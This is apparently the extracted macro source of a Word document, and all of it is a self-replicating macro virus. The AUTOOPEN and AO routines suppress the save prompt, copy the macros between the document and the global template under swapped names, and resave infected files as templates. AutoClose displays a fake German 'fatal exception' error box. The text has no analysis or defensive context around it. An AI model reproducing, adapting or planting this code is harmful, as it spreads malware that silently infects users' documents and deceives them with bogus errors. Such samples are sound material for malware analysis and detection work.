   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   WordBasic.MsgBox "Kann auf Gerät nicht schreiben!", "Schwerer Ausnahmefehler!", 21
   End Sub

   Attribute VB_Name = "AUTOOPEN"

   Public Sub MAIN()
   Dim m$
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   m$ = WordBasic.[FileName$]() + ":AutoClose"
   WordBasic.MacroCopy m$, "Global:AutoClose"
   m$ = WordBasic.[FileName$]() + ":AO"
   WordBasic.MacroCopy m$, "Global:AUTOOPEN"
   m$ = WordBasic.[FileName$]() + ":AUTOOPEN"
   WordBasic.MacroCopy m$, "Global:AO"
   End Sub

   Attribute VB_Name = "AO"

   Public Sub MAIN()
   Dim m$
   Dim n$
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   m$ = WordBasic.[FileName$]() + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", m$
   m$ = WordBasic.[FileName$]() + ":AUTOOPEN"
   WordBasic.MacroCopy "Global:AO", m$
   m$ = WordBasic.[FileName$]() + ":AO"
   WordBasic.MacroCopy "Global:AUTOOPEN", m$
   n$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Name:=n$, Format:=1
   End Sub
